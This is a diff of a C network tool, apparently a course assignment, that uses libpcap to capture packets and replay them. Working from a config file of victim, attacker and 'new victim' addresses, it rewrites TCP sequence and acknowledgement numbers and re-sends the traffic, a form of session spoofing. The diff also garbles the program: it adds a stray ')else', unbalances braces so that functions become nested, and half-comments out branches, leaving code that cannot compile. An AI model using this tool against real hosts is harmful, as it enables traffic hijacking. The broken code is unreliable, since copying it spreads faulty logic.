@@ -270,286 +270,287 @@ void packetHandler(u_char *userData, const struct pcap_pkthdr *packet_header, co
 					*/
 					printf("\t\t\treceived response entered\n");
 
-					if (tcpHeader->th_flags == TH_SYN && tcpHeader->th_flags == TH_ACK)
+					if (tcpHeader->th_flags == TH_SYN || tcpHeader->th_flags == TH_ACK)
 					{
 						temp = (htonl(response_seq) + payload + 1);
 						response_seq = ntohl(temp);
 						memcpy(&tcpHeader->th_ack, &response_seq, sizeof(tcpHeader->th_ack));
+					)else
+					{
+						memcpy(&tcpHeader->th_ack, &payload, sizeof(tcpHeader->th_ack));
 					}
+					/*
 					else if (tcpHeader->th_flags == TH_SYN || tcpHeader->th_flags == TH_ACK)
 					{
 						temp = (htonl(response_seq));
 						response_seq = ntohl(temp);
 						memcpy(&tcpHeader->th_ack, &response_seq, sizeof(tcpHeader->th_ack));
 					}
-					else
-					{
-						memcpy(&tcpHeader->th_ack, &response_seq, sizeof(tcpHeader->th_ack));
-					}
+					*/
 
 					printf("\t\t\tmod seq = %u\n", htonl(tcpHeader->th_seq));
 					printf("\t\t\tmod ack = %u\n", htonl(tcpHeader->th_ack));
+					}
 				}
-			}
-			else if (ipHeader->ip_p == IP_PROTO_UDP)
-			{
-				printf("\t\tUDP\n");
-				udpHeader = (struct udp_hdr *)(packet + sizeof(struct eth_hdr) + sizeof(struct ip_hdr));
-				printf("\t\t\tsrc port = %d\n", htons(udpHeader->uh_sport));
-				printf("\t\t\tdst port = %d\n", htons(udpHeader->uh_dport));
-			}
-			else if (ipHeader->ip_p == IP_PROTO_ICMP)
-			{
-				printf("\t\tICMP\n");
-				icmpHeader = (struct icmp_hdr *)(packet + sizeof(struct eth_hdr) + sizeof(struct ip_hdr));
-				switch (icmpHeader->icmp_type)
+				else if (ipHeader->ip_p == IP_PROTO_UDP)
 				{
-				case ICMP_ECHOREPLY:
-					printf("\t\t\tEcho Reply\n");
+					printf("\t\tUDP\n");
+					udpHeader = (struct udp_hdr *)(packet + sizeof(struct eth_hdr) + sizeof(struct ip_hdr));
+					printf("\t\t\tsrc port = %d\n", htons(udpHeader->uh_sport));
+					printf("\t\t\tdst port = %d\n", htons(udpHeader->uh_dport));
+				}
+				else if (ipHeader->ip_p == IP_PROTO_ICMP)
+				{
+					printf("\t\tICMP\n");
+					icmpHeader = (struct icmp_hdr *)(packet + sizeof(struct eth_hdr) + sizeof(struct ip_hdr));
+					switch (icmpHeader->icmp_type)
+					{
+					case ICMP_ECHOREPLY:
+						printf("\t\t\tEcho Reply\n");
+						break;
+					case ICMP_UNREACH:
+						printf("\t\t\tDestination Unreachable\n");
+						break;
+					case ICMP_SRCQUENCH:
+						printf("\t\t\tSource Quench\n");
+						break;
+					case ICMP_REDIRECT:
+						printf("\t\t\tRoute redirection\n");
+						break;
+					case ICMP_ALTHOSTADDR:
+						printf("\t\t\tAlternate Host Address\n");
+						break;
+					case ICMP_ECHO:
+						printf("\t\t\tEcho\n");
+						break;
+					case ICMP_RTRADVERT:
+						printf("\t\t\tRoute Advertisement\n");
+						break;
+					case ICMP_RTRSOLICIT:
+						printf("\t\t\tRoute Solicitation\n");
+						break;
+					case ICMP_TIMEXCEED:
+						printf("\t\t\tTime Exceeded\n");
+						break;
+					case ICMP_PARAMPROB:
+						printf("\t\t\tBad IP Header\n");
+						break;
+					case ICMP_TSTAMP:
+						printf("\t\t\tTimestamp Request\n");
+						break;
+					case ICMP_TSTAMPREPLY:
+						printf("\t\t\tTime Stamp Reply\n");
+						break;
+					case ICMP_INFO:
+						printf("\t\t\tInformation Request\n");
+						break;
+					case ICMP_INFOREPLY:
+						printf("\t\t\tInformation Reply\n");
+						break;
+					case ICMP_MASK:
+						printf("\t\t\tAddress Mask Request\n");
+						break;
+					case ICMP_TRACEROUTE:
+						printf("\t\t\tTraceroute\n");
+						break;
+					case ICMP_DATACONVERR:
+						printf("\t\t\tData Conversion Error\n");
+						break;
+					case ICMP_MOBILE_REDIRECT:
+						printf("\t\t\tMobile Host Redirection\n");
+						break;
+					case ICMP_IPV6_WHEREAREYOU:
+						printf("\t\t\tIPV6 Where Are You?\n");
+						break;
+					case ICMP_IPV6_IAMHERE:
+						printf("\t\t\tIPV6 I am Here\n");
+						break;
+					case ICMP_MOBILE_REG:
+						printf("\t\t\tMobile Registration Request\n");
+						break;
+					case ICMP_MOBILE_REGREPLY:
+						printf("\t\t\tMobile Registration Reply\n");
+						break;
+					case ICMP_DNS:
+						printf("\t\t\tDomain Name Request\n");
+						break;
+					case ICMP_DNSREPLY:
+						printf("\t\t\tDomain Name Reply\n");
+						break;
+					case ICMP_SKIP:
+						printf("\t\t\tSkip\n");
+						break;
+					case ICMP_PHOTURIS:
+						printf("\t\t\tPhotorius\n");
+						break;
+					default:
+						printf("\t\t\tOther\n");
+						break;
+					}
+				}
+				else if (ipHeader->ip_p == IP_PROTO_IGMP)
+				{
+					igmpHeader = (struct igmp_hdr *)(packet + sizeof(struct eth_hdr) + sizeof(struct ip_hdr));
+					printf("\t\tIGMP\n");
+				}
+				else
+				{
+					printf("\t\tOTHER\n");
+				}
+				break;
+			case 0x806: // ARP Packet
+				printf("\tARP\n");
+				arpHeader = (struct arp_hdr *)(packet + sizeof(struct eth_hdr));
+				switch (arpHeader->ar_op)
+				{
+				case ARP_OP_REQUEST:
+					printf("\t\tARP Request");
 					break;
-				case ICMP_UNREACH:
-					printf("\t\t\tDestination Unreachable\n");
+				case ARP_OP_REPLY:
+					printf("\t\tARP Reply");
 					break;
-				case ICMP_SRCQUENCH:
-					printf("\t\t\tSource Quench\n");
+				case ARP_OP_REVREQUEST:
+					printf("\t\tARP Reverse Reply");
 					break;
-				case ICMP_REDIRECT:
-					printf("\t\t\tRoute redirection\n");
-					break;
-				case ICMP_ALTHOSTADDR:
-					printf("\t\t\tAlternate Host Address\n");
-					break;
-				case ICMP_ECHO:
-					printf("\t\t\tEcho\n");
-					break;
-				case ICMP_RTRADVERT:
-					printf("\t\t\tRoute Advertisement\n");
-					break;
-				case ICMP_RTRSOLICIT:
-					printf("\t\t\tRoute Solicitation\n");
-					break;
-				case ICMP_TIMEXCEED:
-					printf("\t\t\tTime Exceeded\n");
-					break;
-				case ICMP_PARAMPROB:
-					printf("\t\t\tBad IP Header\n");
-					break;
-				case ICMP_TSTAMP:
-					printf("\t\t\tTimestamp Request\n");
-					break;
-				case ICMP_TSTAMPREPLY:
-					printf("\t\t\tTime Stamp Reply\n");
-					break;
-				case ICMP_INFO:
-					printf("\t\t\tInformation Request\n");
-					break;
-				case ICMP_INFOREPLY:
-					printf("\t\t\tInformation Reply\n");
-					break;
-				case ICMP_MASK:
-					printf("\t\t\tAddress Mask Request\n");
-					break;
-				case ICMP_TRACEROUTE:
-					printf("\t\t\tTraceroute\n");
-					break;
-				case ICMP_DATACONVERR:
-					printf("\t\t\tData Conversion Error\n");
-					break;
-				case ICMP_MOBILE_REDIRECT:
-					printf("\t\t\tMobile Host Redirection\n");
-					break;
-				case ICMP_IPV6_WHEREAREYOU:
-					printf("\t\t\tIPV6 Where Are You?\n");
-					break;
-				case ICMP_IPV6_IAMHERE:
-					printf("\t\t\tIPV6 I am Here\n");
-					break;
-				case ICMP_MOBILE_REG:
-					printf("\t\t\tMobile Registration Request\n");
-					break;
-				case ICMP_MOBILE_REGREPLY:
-					printf("\t\t\tMobile Registration Reply\n");
-					break;
-				case ICMP_DNS:
-					printf("\t\t\tDomain Name Request\n");
-					break;
-				case ICMP_DNSREPLY:
-					printf("\t\t\tDomain Name Reply\n");
-					break;
-				case ICMP_SKIP:
-					printf("\t\t\tSkip\n");
-					break;
-				case ICMP_PHOTURIS:
-					printf("\t\t\tPhotorius\n");
+				case ARP_OP_REVREPLY:
+					printf("\t\tARP Reverse Reply");
 					break;
 				default:
-					printf("\t\t\tOther\n");
+					printf("\t\tARP Other");
 					break;
 				}
 			}
-			else if (ipHeader->ip_p == IP_PROTO_IGMP)
+		}
+		ip_checksum((void *)ipHeader, ntohs(ipHeader->ip_len));
+		if (bsend == 1)
+		{
+			receivedResponse = 0;
+			n = pcap_sendpacket(handle, packet, packet_header->len);
+			if (n != 0)
 			{
-				igmpHeader = (struct igmp_hdr *)(packet + sizeof(struct eth_hdr) + sizeof(struct ip_hdr));
-				printf("\t\tIGMP\n");
+				printf("\tPacket not sent because of failure\n\n");
 			}
 			else
 			{
-				printf("\t\tOTHER\n");
+				printf("\tPacket sent\n\n");
+				if (strcmp(timing, "delay") == 0)
+				{
+					usleep(500000);
+				}
 			}
-			break;
-		case 0x806: // ARP Packet
-			printf("\tARP\n");
-			arpHeader = (struct arp_hdr *)(packet + sizeof(struct eth_hdr));
-			switch (arpHeader->ar_op)
-			{
-			case ARP_OP_REQUEST:
-				printf("\t\tARP Request");
-				break;
-			case ARP_OP_REPLY:
-				printf("\t\tARP Reply");
-				break;
-			case ARP_OP_REVREQUEST:
-				printf("\t\tARP Reverse Reply");
-				break;
-			case ARP_OP_REVREPLY:
-				printf("\t\tARP Reverse Reply");
-				break;
-			default:
-				printf("\t\tARP Other");
-				break;
-			}
-		}
-	}
-	ip_checksum((void *)ipHeader, ntohs(ipHeader->ip_len));
-	if (bsend == 1)
-	{
-		receivedResponse = 0;
-		n = pcap_sendpacket(handle, packet, packet_header->len);
-		if (n != 0)
-		{
-			printf("\tPacket not sent because of failure\n\n");
+			bsend = 0;
 		}
 		else
 		{
-			printf("\tPacket sent\n\n");
-			if (strcmp(timing, "delay") == 0)
-			{
-				usleep(500000);
-			}
+			notsent++;
+			printf("\tPacket not sent\n\n");
 		}
-		bsend = 0;
 	}
-	else
-	{
-		notsent++;
-		printf("\tPacket not sent\n\n");
-	}
-}
 
-/*
+	/*
 	print the usage in case of usage error
 */
 
-void usage(int flag)
-{
-	if (flag == 0)
+	void usage(int flag)
 	{
-		printf("wrong usage\n");
-		printf("correct usage: ./assign5 <configuration file>\n");
+		if (flag == 0)
+		{
+			printf("wrong usage\n");
+			printf("correct usage: ./assign5 <configuration file>\n");
+		}
+		else
+		{
+			printf("usage: ./assign5 <configuration file>\n");
+		}
 	}
-	else
-	{
-		printf("usage: ./assign5 <configuration file>\n");
-	}
-}
 
-/*
+	/*
 	read the provided configuration file
 */
 
-void readcfg(char *cfile)
-{
-	FILE *fp;
-	fp = fopen(cfile, "r");
-	if (fp == NULL)
+	void readcfg(char *cfile)
 	{
-		perror(cfile);
-		exit(-1);
+		FILE *fp;
+		fp = fopen(cfile, "r");
+		if (fp == NULL)
+		{
+			perror(cfile);
+			exit(-1);
+		}
+		// Get log file name
+		if (fgets(pcap_filename, sizeof(pcap_filename), fp) == NULL)
+		{
+			fprintf(stderr, "log file name to long");
+			exit(-1);
+		}
+		rmnl(pcap_filename);
+		printf("file name: %s", pcap_filename);
+		//Get victim IP and MAC address
+		if ((err = load_address(fp, ip_victim, eth_victim, &struct_ip_victim, &struct_eth_victim)) < 0)
+			printf("error loading address of victim");
+		printf("ip_victim: %s", ip_victim);
+		printf("eth_victim: %s", eth_victim);
+		// Get Victim Port
+		if (fgets(victim_port, PORT_LENGTH, fp) == NULL)
+		{
+			fprintf(stderr, "Victim Port too Large");
+			exit(-1);
+		}
+		printf("victim_port: %s", victim_port);
+		// Get attatcker IP and MAC address
+		if ((err = load_address(fp, ip_attacker, eth_attacker, &struct_ip_attacker, &struct_eth_attacker)) < 0)
+			printf("error loading address of attacker");
+		printf("ip_attacker: %s", ip_attacker);
+		printf("eth_attacker: %s", eth_attacker);
+		// Get Attacker Port
+		if (fgets(attacker_port, PORT_LENGTH, fp) == NULL)
+		{
+			fprintf(stderr, "Atttacker Port too Large");
+			exit(-1);
+		}
+		printf("attacker_port: %s", attacker_port);
+		// Get new victim IP and MAC address
+		if ((err = load_address(fp, ip_new_victim, eth_new_victim, &struct_ip_new_victim, &struct_eth_new_victim)) < 0)
+			printf("error loading address of new victim");
+		// Get Victim Port
+		if (fgets(new_victim_port, PORT_LENGTH, fp) == NULL)
+		{
+			fprintf(stderr, "New Victim Port too Large");
+			exit(-1);
+		}
+		// Get my IP and MAC address
+		if ((err = load_address(fp, my_ip, my_eth, &struct_my_ip, &struct_my_eth)) < 0)
+			printf("error loading my address\n");
+		// Get My Port
+		if (fgets(my_port, PORT_LENGTH, fp) == NULL)
+		{
+			fprintf(stderr, "My Port too Large");
+			exit(-1);
+		}
+		// Get interface name
+		if (fgets(iface, sizeof(iface), fp) == NULL)
+		{
+			fprintf(stderr, "Interface too large");
+			exit(-1);
+		}
+		rmnl(iface);
+		printf("interface: %s", iface);
+		// Get timing
+		if (fgets(timing, sizeof(timing), fp) == NULL)
+		{
+			fprintf(stderr, "Timing too large");
+			exit(-1);
+		}
+		rmnl(timing);
 	}
-	// Get log file name
-	if (fgets(pcap_filename, sizeof(pcap_filename), fp) == NULL)
-	{
-		fprintf(stderr, "log file name to long");
-		exit(-1);
-	}
-	rmnl(pcap_filename);
-	printf("file name: %s", pcap_filename);
-	//Get victim IP and MAC address
-	if ((err = load_address(fp, ip_victim, eth_victim, &struct_ip_victim, &struct_eth_victim)) < 0)
-		printf("error loading address of victim");
-	printf("ip_victim: %s", ip_victim);
-	printf("eth_victim: %s", eth_victim);
-	// Get Victim Port
-	if (fgets(victim_port, PORT_LENGTH, fp) == NULL)
-	{
-		fprintf(stderr, "Victim Port too Large");
-		exit(-1);
-	}
-	printf("victim_port: %s", victim_port);
-	// Get attatcker IP and MAC address
-	if ((err = load_address(fp, ip_attacker, eth_attacker, &struct_ip_attacker, &struct_eth_attacker)) < 0)
-		printf("error loading address of attacker");
-	printf("ip_attacker: %s", ip_attacker);
-	printf("eth_attacker: %s", eth_attacker);
-	// Get Attacker Port
-	if (fgets(attacker_port, PORT_LENGTH, fp) == NULL)
-	{
-		fprintf(stderr, "Atttacker Port too Large");
-		exit(-1);
-	}
-	printf("attacker_port: %s", attacker_port);
-	// Get new victim IP and MAC address
-	if ((err = load_address(fp, ip_new_victim, eth_new_victim, &struct_ip_new_victim, &struct_eth_new_victim)) < 0)
-		printf("error loading address of new victim");
-	// Get Victim Port
-	if (fgets(new_victim_port, PORT_LENGTH, fp) == NULL)
-	{
-		fprintf(stderr, "New Victim Port too Large");
-		exit(-1);
-	}
-	// Get my IP and MAC address
-	if ((err = load_address(fp, my_ip, my_eth, &struct_my_ip, &struct_my_eth)) < 0)
-		printf("error loading my address\n");
-	// Get My Port
-	if (fgets(my_port, PORT_LENGTH, fp) == NULL)
-	{
-		fprintf(stderr, "My Port too Large");
-		exit(-1);
-	}
-	// Get interface name
-	if (fgets(iface, sizeof(iface), fp) == NULL)
-	{
-		fprintf(stderr, "Interface too large");
-		exit(-1);
-	}
-	rmnl(iface);
-	printf("interface: %s", iface);
-	// Get timing
-	if (fgets(timing, sizeof(timing), fp) == NULL)
-	{
-		fprintf(stderr, "Timing too large");
-		exit(-1);
-	}
-	rmnl(timing);
-}
 
-/*
+	/*
 	open device for sending packets and get my ip and my eth addresses
 */
 
-void open_devices(void)
-{
-	/*
+	void open_devices(void)
+	{
+		/*
 
 	i = intf_open();
 	if (i == NULL)
@@ -582,101 +583,101 @@ void open_devices(void)
 	}
 	*/
 
-	char filter_exp[1024];
-	snprintf(filter_exp, sizeof(filter_exp), "ip src %s", ip_new_victim);
-	char error_buffer[PCAP_ERRBUF_SIZE];
-	bpf_u_int32 subnet_mask, ip;
-	struct bpf_program filter;
+		char filter_exp[1024];
+		snprintf(filter_exp, sizeof(filter_exp), "ip src %s", ip_new_victim);
+		char error_buffer[PCAP_ERRBUF_SIZE];
+		bpf_u_int32 subnet_mask, ip;
+		struct bpf_program filter;
 
-	i = intf_open();
-	if (i == NULL)
-	{
-		perror("intf open error");
-		exit(-1);
-	}
-	strncpy(ie.intf_name, iface, 60);
+		i = intf_open();
+		if (i == NULL)
+		{
+			perror("intf open error");
+			exit(-1);
+		}
+		strncpy(ie.intf_name, iface, 60);
 
-	if (pcap_lookupnet(iface, &ip, &subnet_mask, error_buffer) == -1)
-	{
-		printf("Could not get information for device: %s\n", iface);
-		ip = 0;
-		subnet_mask = 0;
+		if (pcap_lookupnet(iface, &ip, &subnet_mask, error_buffer) == -1)
+		{
+			printf("Could not get information for device: %s\n", iface);
+			ip = 0;
+			subnet_mask = 0;
+		}
+		handle = pcap_open_live(iface, PCAP_ERRBUF_SIZE, 1, 1000, error_buffer);
+		if (handle == NULL)
+		{
+			printf("Could not open %s - %s\n", iface, error_buffer);
+		}
+		if (pcap_compile(handle, &filter, filter_exp, 0, ip) == -1)
+		{
+			printf("Bad filter - %s\n", pcap_geterr(handle));
+		}
+		if (pcap_setfilter(handle, &filter) == -1)
+		{
+			printf("Error setting filter - %s\n", pcap_geterr(handle));
+		}
 	}
-	handle = pcap_open_live(iface, PCAP_ERRBUF_SIZE, 1, 1000, error_buffer);
-	if (handle == NULL)
-	{
-		printf("Could not open %s - %s\n", iface, error_buffer);
-	}
-	if (pcap_compile(handle, &filter, filter_exp, 0, ip) == -1)
-	{
-		printf("Bad filter - %s\n", pcap_geterr(handle));
-	}
-	if (pcap_setfilter(handle, &filter) == -1)
-	{
-		printf("Error setting filter - %s\n", pcap_geterr(handle));
-	}
-}
 
-/*
+	/*
 	load addres into address structure
 */
 
-int load_address(FILE *fp, char *ip, char *eth, struct addr *ip_struct, struct addr *eth_struct)
-{
-	// Get IP address
-	if (fgets(ip, 32, fp) == NULL)
-		return (-1);
-	rmnl(ip);
-	if (addr_aton(ip, ip_struct) == -1)
-		return (-2);
-	if (fgets(eth, 32, fp) == NULL)
-		return (-3);
-	rmnl(eth);
-	if (addr_aton(eth, eth_struct) == -1)
-		return (-4);
-	return (0);
-}
+	int load_address(FILE * fp, char *ip, char *eth, struct addr *ip_struct, struct addr *eth_struct)
+	{
+		// Get IP address
+		if (fgets(ip, 32, fp) == NULL)
+			return (-1);
+		rmnl(ip);
+		if (addr_aton(ip, ip_struct) == -1)
+			return (-2);
+		if (fgets(eth, 32, fp) == NULL)
+			return (-3);
+		rmnl(eth);
+		if (addr_aton(eth, eth_struct) == -1)
+			return (-4);
+		return (0);
+	}
 
-void rmnl(char *s)
-{
-	while (*s != '\n' && *s != '\0')
-		s++;
-	*s = '\0';
-}
+	void rmnl(char *s)
+	{
+		while (*s != '\n' && *s != '\0')
+			s++;
+		*s = '\0';
+	}
 
-void getVictimResponse()
-{
-	printf("\tGetting Actual Response\n");
-	struct pcap_pkthdr header;	 /* The header that pcap gives us */
-	const u_char *response_packet; /* The actual packet */
-	struct tcp_hdr *responseTCPHeader;
-	struct eth_hdr *ethernetResponseHeader;
-	struct ip_hdr *ipHeader;
-	char ip_source_response[ETH_ADDR_BITS], ip_destination_response[ETH_ADDR_BITS];
-	struct ip_hdr *ipHeaderResponse;
+	void getVictimResponse()
+	{
+		printf("\tGetting Actual Response\n");
+		struct pcap_pkthdr header;	 /* The header that pcap gives us */
+		const u_char *response_packet; /* The actual packet */
+		struct tcp_hdr *responseTCPHeader;
+		struct eth_hdr *ethernetResponseHeader;
+		struct ip_hdr *ipHeader;
+		char ip_source_response[ETH_ADDR_BITS], ip_destination_response[ETH_ADDR_BITS];
+		struct ip_hdr *ipHeaderResponse;
 
-	response_packet = pcap_next(handle, &header);
+		response_packet = pcap_next(handle, &header);
 
-	ethernetResponseHeader = (struct eth_hdr *)(response_packet);
+		ethernetResponseHeader = (struct eth_hdr *)(response_packet);
 
-	printf("\tIP\n");
+		printf("\tIP\n");
 
-	ipHeaderResponse = (struct ip_hdr *)(response_packet + sizeof(struct eth_hdr));
-	printf("\t\tip len = %d\n", ipHeaderResponse->ip_len);
+		ipHeaderResponse = (struct ip_hdr *)(response_packet + sizeof(struct eth_hdr));
+		printf("\t\tip len = %d\n", ipHeaderResponse->ip_len);
 
-	ip_ntop(&(ipHeaderResponse->ip_dst), ip_destination_response, IP_ADDR_BITS);
-	ip_ntop(&(ipHeaderResponse->ip_src), ip_source_response, IP_ADDR_BITS);
+		ip_ntop(&(ipHeaderResponse->ip_dst), ip_destination_response, IP_ADDR_BITS);
+		ip_ntop(&(ipHeaderResponse->ip_src), ip_source_response, IP_ADDR_BITS);
 
-	printf("\t\tip src response= %s\n", ip_source_response);
-	printf("\t\tip dst response = %s\n", ip_destination_response);
+		printf("\t\tip src response= %s\n", ip_source_response);
+		printf("\t\tip dst response = %s\n", ip_destination_response);
 
-	responseTCPHeader = (struct tcp_hdr *)(response_packet + sizeof(struct eth_hdr) + sizeof(struct ip_hdr));
+		responseTCPHeader = (struct tcp_hdr *)(response_packet + sizeof(struct eth_hdr) + sizeof(struct ip_hdr));
 
-	response_ack = responseTCPHeader->th_ack;
-	response_seq = responseTCPHeader->th_seq;
+		response_ack = responseTCPHeader->th_ack;
+		response_seq = responseTCPHeader->th_seq;
 
-	printf("\t\t\tgot response seq = %u\n", htonl(responseTCPHeader->th_seq));
-	printf("\t\t\tgot response ack = %u\n\n\n", htonl(response_ack));
+		printf("\t\t\tgot response seq = %u\n", htonl(responseTCPHeader->th_seq));
+		printf("\t\t\tgot response ack = %u\n\n\n", htonl(response_ack));
 
-	receivedResponse = 1;
-}
+		receivedResponse = 1;
+	}
